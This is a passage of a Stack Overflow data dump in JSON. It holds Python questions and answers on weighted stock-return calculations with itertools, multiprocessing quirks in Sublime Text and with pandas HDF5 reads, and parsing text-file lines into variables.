Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1427916413, "post_id": 29398597, "comment_id": 46974140, "body": "@Padraic Cunningham: Added. Terribly sorry for the confusion, trying the best I can to explain. Thanks for your patience!"}, {"owner": {"reputation": 1623, "user_id": 3478500, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/5cdf786c9b662fe86679165d41c41254?s=128&d=identicon&r=PG", "display_name": "thefoxrocks", "link": "https://stackoverflow.com/users/3478500/thefoxrocks"}, "edited": false, "score": 0, "creation_date": 1427916777, "post_id": 29398597, "comment_id": 46974370, "body": "Maybe using <code>.readline()</code>? Then storing each tuple into a different variable, and processing them from there?"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1427917104, "post_id": 29398597, "comment_id": 46974541, "body": "@McLean25, where do <code>stocks,weights_list</code> come from?"}, {"owner": {"reputation": 1623, "user_id": 3478500, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/5cdf786c9b662fe86679165d41c41254?s=128&d=identicon&r=PG", "display_name": "thefoxrocks", "link": "https://stackoverflow.com/users/3478500/thefoxrocks"}, "reply_to_user": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1427917468, "post_id": 29398597, "comment_id": 46974729, "body": "@PadraicCunningham weights_list added. I pull each stock from the document variable, which pulls the stocks I want from a CSV file that I had built previously with Scrapy."}], "answers": [{"comments": [{"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 2, "creation_date": 1427915033, "post_id": 29398754, "comment_id": 46973435, "body": "You would need <code>int(my_dict.get(&#39;a&#39;,0))</code>"}, {"owner": {"reputation": 92930, "user_id": 541038, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a3a82559ae1ee7ec304fdbae095f063c?s=128&d=identicon&r=PG", "display_name": "Joran Beasley", "link": "https://stackoverflow.com/users/541038/joran-beasley"}, "reply_to_user": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1427915078, "post_id": 29398754, "comment_id": 46973460, "body": "Im not at all sure this is what he even wants(especially since all his values for a are lists of ints) ... but yeah"}], "tags": [], "owner": {"reputation": 92930, "user_id": 541038, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a3a82559ae1ee7ec304fdbae095f063c?s=128&d=identicon&r=PG", "display_name": "Joran Beasley", "link": "https://stackoverflow.com/users/541038/joran-beasley"}, "is_accepted": false, "score": 0, "last_activity_date": 1427915065, "last_edit_date": 1427915065, "creation_date": 1427914965, "answer_id": 29398754, "question_id": 29398597, "link": "https://stackoverflow.com/questions/29398597/python-get-dictionary-value-from-a-dictionary-within-a-tuple-within-a-list-and/29398754#29398754", "title": "Python: get dictionary value from a dictionary within a tuple within a list and do something with it", "body": "<pre><code>products = [int(my_dict.get('a',0))*b for my_dict,b in my_list]\n</code></pre>\n\n<p>might be what you are trying for ... ?</p>\n"}, {"comments": [{"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 1623, "user_id": 3478500, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/5cdf786c9b662fe86679165d41c41254?s=128&d=identicon&r=PG", "display_name": "thefoxrocks", "link": "https://stackoverflow.com/users/3478500/thefoxrocks"}, "edited": false, "score": 0, "creation_date": 1427917727, "post_id": 29399414, "comment_id": 46974886, "body": "@McLean25, no worries, what do you want to pass to  <code>numpy.correlate</code>?"}, {"owner": {"reputation": 1623, "user_id": 3478500, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/5cdf786c9b662fe86679165d41c41254?s=128&d=identicon&r=PG", "display_name": "thefoxrocks", "link": "https://stackoverflow.com/users/3478500/thefoxrocks"}, "edited": false, "score": 0, "creation_date": 1427917945, "post_id": 29399414, "comment_id": 46975003, "body": "The dict key will be &#39;returns&#39;. I deleted the key and values in order to reduce noise when I posted the question above as the value for &#39;returns&#39; is a list of 121 int."}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 1623, "user_id": 3478500, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/5cdf786c9b662fe86679165d41c41254?s=128&d=identicon&r=PG", "display_name": "thefoxrocks", "link": "https://stackoverflow.com/users/3478500/thefoxrocks"}, "edited": false, "score": 0, "creation_date": 1427918068, "post_id": 29399414, "comment_id": 46975091, "body": "@McLean25, I presume correlate expects an iterable, do you want to pass a,b a,c and b,c to it?"}, {"owner": {"reputation": 1623, "user_id": 3478500, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/5cdf786c9b662fe86679165d41c41254?s=128&d=identicon&r=PG", "display_name": "thefoxrocks", "link": "https://stackoverflow.com/users/3478500/thefoxrocks"}, "edited": false, "score": 0, "creation_date": 1427918115, "post_id": 29399414, "comment_id": 46975115, "body": "the goal is to set the correlation for all combinations of the three stocks given in each loop. For example: <code>corr_stock1_2 = numpy.correlation(stock1[&#39;returns&#39;],stock2[&#39;returns&#39;])</code> and so on"}, {"owner": {"reputation": 1623, "user_id": 3478500, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/5cdf786c9b662fe86679165d41c41254?s=128&d=identicon&r=PG", "display_name": "thefoxrocks", "link": "https://stackoverflow.com/users/3478500/thefoxrocks"}, "edited": false, "score": 0, "creation_date": 1427918180, "post_id": 29399414, "comment_id": 46975159, "body": "Yes, that is exactly it."}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 1623, "user_id": 3478500, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/5cdf786c9b662fe86679165d41c41254?s=128&d=identicon&r=PG", "display_name": "thefoxrocks", "link": "https://stackoverflow.com/users/3478500/thefoxrocks"}, "edited": false, "score": 0, "creation_date": 1427918212, "post_id": 29399414, "comment_id": 46975173, "body": "so <code>for a,b in p: print(numpy.correlate([a],[b]))</code>? Does it work for two single values?"}, {"owner": {"reputation": 1623, "user_id": 3478500, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/5cdf786c9b662fe86679165d41c41254?s=128&d=identicon&r=PG", "display_name": "thefoxrocks", "link": "https://stackoverflow.com/users/3478500/thefoxrocks"}, "reply_to_user": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1427918577, "post_id": 29399414, "comment_id": 46975367, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/74290/discussion-between-mclean25-and-padraic-cunningham\">continue this discussion in chat</a>."}], "tags": [], "owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "is_accepted": true, "score": 1, "last_activity_date": 1427918690, "last_edit_date": 1427918690, "creation_date": 1427917350, "answer_id": 29399414, "question_id": 29398597, "link": "https://stackoverflow.com/questions/29398597/python-get-dictionary-value-from-a-dictionary-within-a-tuple-within-a-list-and/29399414#29399414", "title": "Python: get dictionary value from a dictionary within a tuple within a list and do something with it", "body": "<pre><code>print(sum(float(d['avgreturns'])* b for d,b in l))\n</code></pre>\n\n<p>If you want a,b a,c  and b,c use <code>itertools.combinations</code>:</p>\n\n<pre><code>from itertools import combinations\nr = [float(d['avgreturns']) * b for d, b in l]\np = combinations(r,2) \nprint(sum(r))\n</code></pre>\n"}], "owner": {"reputation": 1623, "user_id": 3478500, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/5cdf786c9b662fe86679165d41c41254?s=128&d=identicon&r=PG", "display_name": "thefoxrocks", "link": "https://stackoverflow.com/users/3478500/thefoxrocks"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 689, "favorite_count": 0, "accepted_answer_id": 29399414, "answer_count": 2, "score": 1, "last_activity_date": 1427918690, "creation_date": 1427914476, "last_edit_date": 1592644375, "question_id": 29398597, "link": "https://stackoverflow.com/questions/29398597/python-get-dictionary-value-from-a-dictionary-within-a-tuple-within-a-list-and", "title": "Python: get dictionary value from a dictionary within a tuple within a list and do something with it", "body": "<p>I've happened to get myself into a somewhat complex situation (for me at least).</p>\n<p>I have a list, which contains a tuple, which contains multiple <code>combinations</code> from <code>itertools</code> of a dictionary and a value, presented below:</p>\n<pre><code>[({'a':'1,2,3','b':'2','c':'3'},0.25),({'a':'3,4,5','b':'4','c':'6'},0.50),({'a':'10,4,3','b':'6','c':'4'},0.25)\n</code></pre>\n<p>I need to get the values of only certain keys in order to do a calculation I want. Lets say I wanted to get the correlation of <code>'a'</code> for each dictionary with one other dictionary in the tuple:</p>\n<pre><code>for tuple in list:\n    for dict in tuple:\n        a = dict.get('a')\n        for a_triplet in intertools.combinations(a, 2):\n            np.correlate(a,b) for a,b in tuple\n</code></pre>\n<p>I know this code is probably egregious to many of you, but I am new to python (and coding in general) and don't know much about iterating through tuples and dictionaries.</p>\n<h1>Update</h1>\n<p>Example of input:</p>\n<pre><code>[({'url': 'https://ca.finance.yahoo.com/q/hp?s=QEC.TO&amp;a=02&amp;b=2&amp;c=2005&amp;d=02&amp;e=2&amp;f=2015&amp;g=m&amp;z=66&amp;y=66', 'varreturns': '0.847771901', 'sdreturns': '0.920745296', 'name': 'Questerre Energy Corp (QEC.TO)', 'avgreturns': '1.292727273'}, 0.25), ({'url': 'https://ca.finance.yahoo.com/q/hp?s=RBA.TO&amp;a=02&amp;b=2&amp;c=2005&amp;d=02&amp;e=2&amp;f=2015&amp;g=m&amp;z=66&amp;y=66', 'varreturns': '16.6860534', 'sdreturns': '4.084856595', 'name': 'Ritchie Bros Auctioneers Inc (RBA.TO)', 'avgreturns': '20.71140496'}, 0.5), ({'url': 'https://ca.finance.yahoo.com/q/hp?s=RDK.TO&amp;a=02&amp;b=2&amp;c=2005&amp;d=02&amp;e=2&amp;f=2015&amp;g=m&amp;z=66&amp;y=66', 'varreturns': '0.038118899', 'sdreturns': '0.195240618', 'name': 'Redhawk Resources Inc (RDK.TO)', 'avgreturns': '0.400330579'}, 0.25)]\n</code></pre>\n<p>each tuple is a different stock that has been assigned a different weight through itertools</p>\n<p>Given by code:</p>\n<pre><code>import itertools\nimport csv\n\nnames = []\nstocks = []\nwith open('AbCtest.csv', 'rU') as csvfile:\n    reader = csv.DictReader(csvfile)\n    document = reader\n    for row in reader:\n        stock = row\n        stocks.append(row)\n        name = row['name']\n        names.append(name)\n\nweights_list = [(0.95, 0.025, 0.025),\n               (0.90, 0.05, 0.05),\n               (0.85, 0.075, 0.075),\n               (0.80, 0.1, 0.1),\n               (0.75, 0.125, 0.125),\n               (0.70, 0.15, 0.15),\n               (0.65, 0.175, 0.175),\n               (0.60, 0.20, 0.20),\n               (0.55, 0.225, 0.225),\n               (0.50, 0.25, 0.25)]\ndef portfolios(document, weights_list):\n    for stock_triplet in itertools.combinations(document, 3):\n        for weights in weights_list:\n            unique_weight_orders = set(itertools.permutations(weights))\n            for weight_order in unique_weight_orders:\n                yield zip(stock_triplet, weight_order)\n\nfor port in portfolios(stocks,weights_list):\n    print port\n</code></pre>\n<p>Hopeful output example:</p>\n<pre><code>10.778966942999999\n</code></pre>\n<p>Given by:</p>\n<pre><code>('avgreturns' * weight) + ('avgreturns' * weight) + ('avgreturns' * weight)\n\n#or, from taking the values given in &quot;example of input&quot;\n\n(0.400330579*0.25)+(20.71140496*0.5)+(1.292727273*0.25)\n</code></pre>\n<p><strong>As for the correlation part:</strong></p>\n<p>I understand this will be much harder, and will likely require use of <code>itertools</code> once again.</p>\n<p>Let's say we name each tuple in the &quot;example input&quot;: &quot;a&quot;, &quot;b&quot;, and &quot;c&quot;. How would we find the correlation between &quot;a&quot; and &quot;b&quot;, &quot;b&quot; and &quot;c&quot;, and &quot;a&quot;, and &quot;c&quot;?</p>\n<p>for all possible combinations of 'avgreturns' in &quot;example input&quot;:</p>\n<pre><code>corr_ab = numpy.correlate('avgreturns','avgreturns')\ncorr_ac = numpy.correlate('avgreturns','avgreturns')\ncorr_cb = numpy.correlate('avgreturns','avgreturns')\n</code></pre>\n<p>Thankful for any help recieved!</p>\n<p>Cheers!</p>\n"}, {"tags": ["python", "macos", "multiprocessing", "sublimetext3"], "comments": [{"owner": {"reputation": 3080, "user_id": 1687452, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/DHjiK.jpg?s=128&g=1", "display_name": "Matthew Turner", "link": "https://stackoverflow.com/users/1687452/matthew-turner"}, "edited": false, "score": 0, "creation_date": 1427914248, "post_id": 29398502, "comment_id": 46972969, "body": "I don&#39;t understand what the problem is."}, {"owner": {"reputation": 19255, "user_id": 428862, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/7041b76f657ac8e8d32a72f1b8b5b4bb?s=128&d=identicon&r=PG", "display_name": "Merlin", "link": "https://stackoverflow.com/users/428862/merlin"}, "reply_to_user": {"reputation": 3080, "user_id": 1687452, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/DHjiK.jpg?s=128&g=1", "display_name": "Matthew Turner", "link": "https://stackoverflow.com/users/1687452/matthew-turner"}, "edited": false, "score": 0, "creation_date": 1427914324, "post_id": 29398502, "comment_id": 46973011, "body": "multiprocessing module is missing the module methods"}], "answers": [{"tags": [], "owner": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "is_accepted": true, "score": 2, "last_activity_date": 1427920208, "creation_date": 1427920208, "answer_id": 29400163, "question_id": 29398502, "link": "https://stackoverflow.com/questions/29398502/sublime-text-3-with-python-on-macosx-module-missing-its-methods/29400163#29400163", "title": "Sublime Text 3 with python on MacOSX -- Module missing its methods", "body": "<p>I assume you're trying to run this code within a Sublime plugin, or via the Sublime console (<kbd>Ctrl</kbd><kbd>`</kbd>). If so, you are using the version of Python that ships with Sublime (3.3.3 for ST3 at the moment) for internal use. While it does include the <code>multiprocessing</code> module, it is a stripped-down version only including the methods/classes that Sublime needs. There are a number of other modules in the \"normal\" Python standard library that are not included in Sublime, including, for example, <code>Tk</code>/<code>tkinter</code>, <code>idlelib</code>, <code>turtle</code>, <code>asyncio</code>, etc. </p>\n\n<p>If you want to play with <code>multiprocessing</code> on your own, you'll need to run your <code>.py</code> file through the version of Python installed on your computer, either using a build system or through <a href=\"https://packagecontrol.io/packages/SublimeREPL\" rel=\"nofollow\"><code>SublimeREPL</code></a>.</p>\n"}], "owner": {"reputation": 19255, "user_id": 428862, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/7041b76f657ac8e8d32a72f1b8b5b4bb?s=128&d=identicon&r=PG", "display_name": "Merlin", "link": "https://stackoverflow.com/users/428862/merlin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 106, "favorite_count": 1, "accepted_answer_id": 29400163, "answer_count": 1, "score": 1, "last_activity_date": 1427920208, "creation_date": 1427914154, "last_edit_date": 1427914490, "question_id": 29398502, "link": "https://stackoverflow.com/questions/29398502/sublime-text-3-with-python-on-macosx-module-missing-its-methods", "title": "Sublime Text 3 with python on MacOSX -- Module missing its methods", "body": "<p>With  <code>\"import multiprocessing\"</code> and <code>dir(multiprocessing)</code>:</p>\n\n<p>Using Sublime Text 3 latest -- 3083 I get:</p>\n\n<pre><code> [ '__builtins__', '__doc__', '__file__', '__name__', '__package__', 'multiprocessing']\n</code></pre>\n\n<p>Using terminal I get: </p>\n\n<pre><code>Python 2.7.9 (default, Feb 10 2015, 03:29:19) \n[GCC 4.2.1 Compatible Apple LLVM 6.0 (clang-600.0.56)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; import multiprocessing\n&gt;&gt;&gt; dir( multiprocessing)\n['Array', 'AuthenticationError', 'BoundedSemaphore', 'BufferTooShort', 'Condition', 'Event', 'JoinableQueue', 'Lock', 'Manager', 'Pipe', 'Pool', 'Process', 'ProcessError', 'Queue', 'RLock', 'RawArray', 'RawValue', 'SUBDEBUG', 'SUBWARNING', 'Semaphore', 'TimeoutError', 'Value', '__all__', '__author__', '__builtins__', '__doc__', '__file__', '__name__', '__package__', '__path__', '__version__', '_multiprocessing', 'active_children', 'allow_connection_pickling', 'cpu_count', 'current_process', 'freeze_support', 'get_logger', 'log_to_stderr', 'os', 'process', 'sys', 'util']\n</code></pre>\n\n<p>How do I fix? </p>\n"}, {"tags": ["python", "pandas", "multiprocessing"], "comments": [{"owner": {"reputation": 35789, "user_id": 1219295, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BmJq2.png?s=128&g=1", "display_name": "Roland Smith", "link": "https://stackoverflow.com/users/1219295/roland-smith"}, "edited": false, "score": 0, "creation_date": 1427923212, "post_id": 29398442, "comment_id": 46977792, "body": "If you really want to speed things up with multiprocessing, you should try to do the <i>actual work</i> on the data in the <code>Pool</code>, without shuffling lots of data from child to parent process."}], "answers": [{"tags": [], "owner": {"reputation": 55248, "user_id": 642070, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c280b71b3187d1cc113a6e302b414b9?s=128&d=identicon&r=PG", "display_name": "tdelaney", "link": "https://stackoverflow.com/users/642070/tdelaney"}, "is_accepted": true, "score": 0, "last_activity_date": 1427915722, "creation_date": 1427915722, "answer_id": 29398975, "question_id": 29398442, "link": "https://stackoverflow.com/questions/29398442/python-multiprocessing-return-value-time/29398975#29398975", "title": "python multiprocessing return value time", "body": "<p>The problem is the cost of communication with the child process. The child pickles the dataframe, sends it to the parent and then the parent unpickles the dataframe. This could easily be more expensive than just reading the dataframe in the parent.</p>\n\n<p>Since a fair amount of the work is being done without holding the GIL, you may find a thread pool is faster. Substitute <code>multiprocessing.pool.ThreadPool</code> for pool and see what happens.</p>\n\n<p>Also, if you can delegate the dataframe processing to the child, you'll benefit from multiprocessing again.</p>\n"}], "owner": {"reputation": 351, "user_id": 1764531, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/d2022562526f885c68d2f2cf9a242820?s=128&d=identicon&r=PG", "display_name": "Mark5907", "link": "https://stackoverflow.com/users/1764531/mark5907"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 144, "favorite_count": 0, "accepted_answer_id": 29398975, "answer_count": 1, "score": 0, "last_activity_date": 1427915722, "creation_date": 1427913938, "last_edit_date": 1427914225, "question_id": 29398442, "link": "https://stackoverflow.com/questions/29398442/python-multiprocessing-return-value-time", "title": "python multiprocessing return value time", "body": "<p>I have a simple function which reads a HDF5 files and returns a pandas dataFrame</p>\n\n<pre><code>import pandas as pd\nimport multiprocess as mp\n\ndef read_file(filename):\n   store = pd.HDFStore(filename, 'r')\n   df = store['df']\n   return df\n\n\nfilename = ['20150320', '20150323','20150302']\n\nT = Timer()\nT.start()\npool = mp.Pool(processes=3)\nresults=pool.map(getG1X1Day, dates)\nT.done('done')\n</code></pre>\n\n<p>The output I have is </p>\n\n<pre><code>load 20150323...: 8.363\nload 20150320...: 8.898\nload 20150302...: 11.316\ndone: 39.110\n</code></pre>\n\n<p>The run time is longer than reading each file separately. Why will this happen and how to solve this? Would like to read hundreds of file and read X of them in parallel. </p>\n\n<p>Thanks!</p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 92930, "user_id": 541038, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a3a82559ae1ee7ec304fdbae095f063c?s=128&d=identicon&r=PG", "display_name": "Joran Beasley", "link": "https://stackoverflow.com/users/541038/joran-beasley"}, "edited": false, "score": 4, "creation_date": 1427914007, "post_id": 29398373, "comment_id": 46972840, "body": "<code>a,b=fin.readline().split()</code> ... not even worth posting as an answer ..."}, {"owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "reply_to_user": {"reputation": 92930, "user_id": 541038, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a3a82559ae1ee7ec304fdbae095f063c?s=128&d=identicon&r=PG", "display_name": "Joran Beasley", "link": "https://stackoverflow.com/users/541038/joran-beasley"}, "edited": false, "score": 0, "creation_date": 1427914660, "post_id": 29398373, "comment_id": 46973212, "body": "@Joran: <code>split()</code> by itself doesn&#39;t split on commas."}, {"owner": {"reputation": 92930, "user_id": 541038, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a3a82559ae1ee7ec304fdbae095f063c?s=128&d=identicon&r=PG", "display_name": "Joran Beasley", "link": "https://stackoverflow.com/users/541038/joran-beasley"}, "edited": false, "score": 1, "creation_date": 1427914706, "post_id": 29398373, "comment_id": 46973232, "body": "ahhh dang ... my smartassery bites me in the keister again"}, {"owner": {"reputation": 881859, "user_id": 100297, "user_type": "moderator", "profile_image": "https://www.gravatar.com/avatar/24780fb6df85a943c7aea0402c843737?s=128&d=identicon&r=PG", "display_name": "Martijn Pieters", "link": "https://stackoverflow.com/users/100297/martijn-pieters"}, "edited": false, "score": 0, "creation_date": 1431107641, "post_id": 29398373, "comment_id": 48369927, "body": "What, if anything, does the extra code-dump have to do with your question?"}], "answers": [{"comments": [{"owner": {"reputation": 136, "user_id": 2069574, "user_type": "registered", "accept_rate": 70, "profile_image": "https://graph.facebook.com/10205166405618379/picture?type=large", "display_name": "dipayan", "link": "https://stackoverflow.com/users/2069574/dipayan"}, "edited": false, "score": 0, "creation_date": 1427947432, "post_id": 29398617, "comment_id": 46984470, "body": "That means, f and k will be stored in the same variable ,lines[2].  I want to store it in two different variable, say a and b."}, {"owner": {"reputation": 9336, "user_id": 1199464, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/c46065552123344aa8fb40f4366790f3?s=128&d=identicon&r=PG", "display_name": "markwalker_", "link": "https://stackoverflow.com/users/1199464/markwalker"}, "reply_to_user": {"reputation": 136, "user_id": 2069574, "user_type": "registered", "accept_rate": 70, "profile_image": "https://graph.facebook.com/10205166405618379/picture?type=large", "display_name": "dipayan", "link": "https://stackoverflow.com/users/2069574/dipayan"}, "edited": false, "score": 0, "creation_date": 1427957118, "post_id": 29398617, "comment_id": 46987658, "body": "@DipayanDev I haven&#39;t declared any variables there, I&#39;ve just shown what each part of <code>lines</code> looks like hence the <code>==</code>. You can declare your variables from <code>lines</code>, like <code>a, b = lines[2].split(&#39;,&#39;)</code>"}], "tags": [], "owner": {"reputation": 9336, "user_id": 1199464, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/c46065552123344aa8fb40f4366790f3?s=128&d=identicon&r=PG", "display_name": "markwalker_", "link": "https://stackoverflow.com/users/1199464/markwalker"}, "is_accepted": false, "score": 1, "last_activity_date": 1427957809, "last_edit_date": 1427957809, "creation_date": 1427914553, "answer_id": 29398617, "question_id": 29398373, "link": "https://stackoverflow.com/questions/29398373/how-to-store-values-of-a-particular-line-of-a-text-file-in-separate-variables-in/29398617#29398617", "title": "How to store values of a particular line of a text file in separate variables in Python", "body": "<p>Use with open;</p>\n\n<pre><code>with open('my.txt') as f:\n    lines = f.read().splitlines()\n    # lines[0] == 'a,b,c,d,e,f,g,h'\n    # lines[1] == 'a,b,c,i,j,k,l,m' \n    # lines[2] == 'f,k'\n    # lines[3] == '.'\n\n    n = list(lines[0].split(','))\n    m = list(lines[1].split(','))\n    a, b = lines[2].split(',')\n\n    # n == ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h    ']\n    # m == ['a', 'b', 'c', 'i', 'j', 'k', 'l', 'm    ']\n    # a == f\n    # b == k\n</code></pre>\n\n<p>Then you can do what you want with each line.</p>\n"}, {"tags": [], "owner": {"reputation": 794, "user_id": 4732480, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/451c84ef8398ba67ff607a8160dd6fbc?s=128&d=identicon&r=PG&f=1", "display_name": "mmachine", "link": "https://stackoverflow.com/users/4732480/mmachine"}, "is_accepted": false, "score": 4, "last_activity_date": 1427914819, "last_edit_date": 1427914819, "creation_date": 1427914665, "answer_id": 29398657, "question_id": 29398373, "link": "https://stackoverflow.com/questions/29398373/how-to-store-values-of-a-particular-line-of-a-text-file-in-separate-variables-in/29398657#29398657", "title": "How to store values of a particular line of a text file in separate variables in Python", "body": "<p>Method <code>readline()</code> returns string. To get a list you have to use:</p>\n\n<pre><code>m=fin.readline().strip().split(',')\nn=fin.readline().strip().split(',')\na,b=fin.readline().strip().split(',')\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 136, "user_id": 2069574, "user_type": "registered", "accept_rate": 70, "profile_image": "https://graph.facebook.com/10205166405618379/picture?type=large", "display_name": "dipayan", "link": "https://stackoverflow.com/users/2069574/dipayan"}, "edited": false, "score": 0, "creation_date": 1427947356, "post_id": 29398803, "comment_id": 46984448, "body": "I tried your solution. It shows error when I am trying to access &#39;a&#39; in the later program.  IndexError: List index out of range ( at &#39;a&#39;)"}, {"owner": {"reputation": 1671, "user_id": 4669462, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/03fub.jpg?s=128&g=1", "display_name": "logic", "link": "https://stackoverflow.com/users/4669462/logic"}, "reply_to_user": {"reputation": 136, "user_id": 2069574, "user_type": "registered", "accept_rate": 70, "profile_image": "https://graph.facebook.com/10205166405618379/picture?type=large", "display_name": "dipayan", "link": "https://stackoverflow.com/users/2069574/dipayan"}, "edited": false, "score": 0, "creation_date": 1427947730, "post_id": 29398803, "comment_id": 46984538, "body": "@DipayanDev That would depend how you&#39;re calling <code>a</code> later on in the program. Either edit that into your question or ask a new question for that problem. Preferably the latter."}, {"owner": {"reputation": 1671, "user_id": 4669462, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/03fub.jpg?s=128&g=1", "display_name": "logic", "link": "https://stackoverflow.com/users/4669462/logic"}, "reply_to_user": {"reputation": 136, "user_id": 2069574, "user_type": "registered", "accept_rate": 70, "profile_image": "https://graph.facebook.com/10205166405618379/picture?type=large", "display_name": "dipayan", "link": "https://stackoverflow.com/users/2069574/dipayan"}, "edited": false, "score": 0, "creation_date": 1427947991, "post_id": 29398803, "comment_id": 46984597, "body": "@DipayanDev I made an edit to my code, try it now. Let me know if it works."}, {"owner": {"reputation": 136, "user_id": 2069574, "user_type": "registered", "accept_rate": 70, "profile_image": "https://graph.facebook.com/10205166405618379/picture?type=large", "display_name": "dipayan", "link": "https://stackoverflow.com/users/2069574/dipayan"}, "edited": false, "score": 0, "creation_date": 1427948115, "post_id": 29398803, "comment_id": 46984622, "body": "with open(&#39;input.txt&#39;) as fin:     n=fin.readline().split()     m=fin.readline().split()     line=(fin.readline())     a,b=line[0],line[2]     print (a)      print (b)     print (n) i=0 while(n[i]==m[i]):     i+=1 cp=i-1 i=0 while(n[i]!=a):     i+=1 posa=i-1 i=0 while(m[i]!=b):     i+=1 posb=i-1 while(posa&gt;cp):     posa-=1 while(posa&gt;cp):     posb-=1  if(cp&lt;0):     print(&quot;No Common Predecessor&quot;) elif (posa&lt;posb):     if(posa&lt;0):         posa=0     print(&quot;Common Predecessor: %s&quot; %n[posa]) else:     if(posb&lt;0):         posb=0     print(&quot;Common Predecessor: %s&quot; %m[posb])"}, {"owner": {"reputation": 1671, "user_id": 4669462, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/03fub.jpg?s=128&g=1", "display_name": "logic", "link": "https://stackoverflow.com/users/4669462/logic"}, "reply_to_user": {"reputation": 136, "user_id": 2069574, "user_type": "registered", "accept_rate": 70, "profile_image": "https://graph.facebook.com/10205166405618379/picture?type=large", 